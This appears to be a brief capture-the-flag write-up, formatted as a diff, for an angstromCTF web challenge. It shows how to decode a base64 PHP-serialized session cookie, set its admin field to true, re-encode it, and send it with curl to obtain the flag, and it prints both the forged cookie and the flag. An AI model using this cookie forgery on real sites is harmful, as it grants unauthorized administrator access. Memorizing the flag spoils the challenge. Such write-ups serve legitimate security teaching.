@@ -1,0 +1,23 @@
+Looking at our cookies on the page reveals a cookie with the name not_a_pastry, which is encoded via base64.
+Decoding the string gives us a serialized object like the following:
+
+O:7:"Session":2:{s:10:"start_time";i:1460242151;s:5:"admin";b:0;}
+
+
+We want to become admin, so let's change the value from 0 to 1;
+
+O:7:"Session":2:{s:10:"start_time";i:1460242151;s:5:"admin";b:1;}
+
+Encode it back to base64 and query the website with your new cookie:
+
+$ curl http://web.angstromctf.com:1339/ --cookie "not_a_pastry=Tzo3OiJTZXNzaW9uIjoyOntzOjEwOiJzdGFydF90aW1lIjtpOjE0NjAyNDIxNTE7czo1OiJhZG1pbiI7YjoxO30K"
+
+
+<html>
+    <head>
+        <title>Not A Pastry</title>
+    </head>
+    <body>
+<h1>Congratulations!</h1>  Your flag is: good_ole_fashioned_homemade_cookies</html>
+
+good_ole_fashioned_homemade_cookies
